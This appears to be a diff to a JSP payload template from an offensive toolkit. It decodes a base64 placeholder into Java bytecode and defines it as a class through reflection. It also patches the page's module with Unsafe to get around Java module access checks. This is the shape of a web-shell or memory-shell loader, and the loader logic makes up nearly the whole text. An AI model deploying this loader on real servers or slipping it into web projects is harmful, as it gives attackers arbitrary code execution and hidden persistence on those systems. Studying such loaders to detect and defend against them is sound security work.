@@ -1,25 +1,4 @@
-<%@ page import="java.lang.*" %>
-<%@ page import="java.lang.Class" %>
-<%@ page import="java.lang.ClassLoader" %>
-<%@ page import="java.lang.ClassNotFoundException" %>
-<%@ page import="java.lang.Integer" %>
-<%@ page import="java.lang.Long" %>
-<%@ page import="java.lang.Object" %>
-<%@ page import="java.lang.String" %>
-<%@ page import="java.lang.Thread" %>
-<%@ page import="java.lang.Throwable" %>
 <%
-    String base64Str = "{{base64Str}}";
-    byte[] bytecode = null;
-    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-    try {
-        Class base64Clz = classLoader.loadClass("java.util.Base64");
-        Object decoder = base64Clz.getMethod("getDecoder").invoke(null);
-        bytecode = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
-    } catch (ClassNotFoundException ee) {
-        Class datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
-        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(null, base64Str);
-    }
     Object unsafe = null;
     Object rawModule = null;
     long offset = 48;
@@ -37,10 +16,19 @@
         getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
     } catch (Throwable ignored) {
     }
-    java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
+    String base64Str = "{{base64Str}}";
+    byte[] bytecode = null;
+    try {
+        Class base64Clz = Class.forName("java.util.Base64");
+        Object decoder = base64Clz.getMethod("getDecoder").invoke(null);
+        bytecode = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+    } catch (ClassNotFoundException ee) {
+        Class datatypeConverterClz = Class.forName("javax.xml.bind.DatatypeConverter");
+        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(null, base64Str);
+    }
     java.lang.reflect.Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
     defMethod.setAccessible(true);
-    Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, bytecode, 0, bytecode.length);
+    Class<?> clazz = (Class<?>) defMethod.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);
     if (getAndSetObjectM != null) {
         getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
     }
